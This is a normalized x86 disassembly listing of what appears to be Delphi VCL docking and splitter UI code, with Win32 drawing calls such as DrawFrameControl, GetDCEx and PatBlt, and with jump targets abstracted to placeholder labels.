mov edx [ ebp - 0xc ]
mov eax ebx
call sub_441368
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_44215c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_438960
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_439740
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_403258
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_4423ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_412378
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41d438
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442404
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41c6d0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_41d0ec
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_41d08c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_41d08c
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41c6d0
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_41d08c
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41d08c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_44248c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_4423ac
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_442404
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_442404
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_4423ac
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_442404
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_442404
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_442568
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cb00
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4426be
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_43761c
mov eax [ ebp - 0x4 ]
call sub_41d0c4
xor eax eax
push ebp
push sub_4426a1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41d4b8
xor eax eax
push ebp
push sub_442684
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_43bf58
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44268b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41d4b8
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_43bf1c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_4383e0
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_4426cc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_43dd58
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_438488
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_438444
mov ecx eax
xor edx edx
xor eax eax
call sub_412378
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_43f228
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4123a0
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_442840
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_442840
pop ecx
mov eax ebx
call sub_403258
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_442840
pop ecx
sub_442874
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_442840
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403258
xor eax eax
mov [ esi + 0x64 ] eax
sub_4428d0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4418e0
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_44290c
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44290c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_442b79
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a90
mov edx [ ebp - 0x8 ]
pop eax
call sub_404258
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
mov eax [ ebx + 0x14 ]
call sub_44106c
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a90
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a90
mov edx [ ebp - 0x10 ]
pop eax
call sub_404258
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403258
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442b80
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403fb4
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_44141c
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_441594
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4415d0
mov eax [ ebx + 0x18 ]
call sub_44141c
mov [ edx + 0x18 ] eax
push esi
push sub_44311c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_441948
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_4415d0
mov eax [ esi + 0x64 ]
call sub_441594
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403258
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_4430f4
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403258
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_441118
mov edx eax
mov eax edi
call sub_4415bc
mov eax edi
call sub_44141c
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_44311c
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_441948
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_44311c
mov edx [ eax + 0x14 ]
mov eax esi
call sub_441948
mov eax [ ebx + 0x14 ]
call sub_403258
mov eax edi
call sub_403258
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_442b88
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_43dd58
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407b14
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_4415bc
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_43dcc4
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_4415bc
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_442fa4
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_44311c
xor edx edx
mov eax edi
call sub_441948
sub_442c64
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_441594
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a5c
mov edx eax
mov eax ebx
call sub_4415bc
sub_442ca0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_442d0b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_404250
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442d12
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_442d18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_442dc7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_441324
mov eax [ ebp - 0x8 ]
call sub_442ca0
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_442d18
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442dce
lea eax [ ebp - 0x8 ]
call sub_403f90
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_442d18
pop ecx
sub_442dd4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442f0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_442ebc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_43dcc4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442ec3
mov eax [ ebp - 0x10 ]
call sub_403258
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_442ca0
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_43dcd8
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_442ec3
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_442d18
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442f14
lea eax [ ebp - 0x14 ]
call sub_403f90
retn
sub_442f1c
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44166c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_441694
call sub_442f1c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44166c
call sub_442f1c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_44109c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_441594
mov edx eax
mov eax ebx
call sub_4415bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_4415bc
jmp r-xdata
sub_442fa4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_442f1c
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_442fe8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_441594
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_4415bc
sub_443018
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_43f228
mov edx eax
mov eax [ rw-data ]
call sub_443b78
mov eax [ ebx + 0x14 ]
call sub_43f228
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_44312c
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_443078
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_443b78
mov eax ebx
call sub_44312c
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_4415bc
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_4415bc
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_442fa4
push ebx
push sub_44311c
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_441948
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_4430f4
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_43dcc4
test eax eax
jle r-xdata
push ebx
push sub_44311c
xor edx edx
mov eax ebx
call sub_441948
sub_44312c
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_441160
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_441160
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_4411cc
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_4411cc
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41c9e4
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
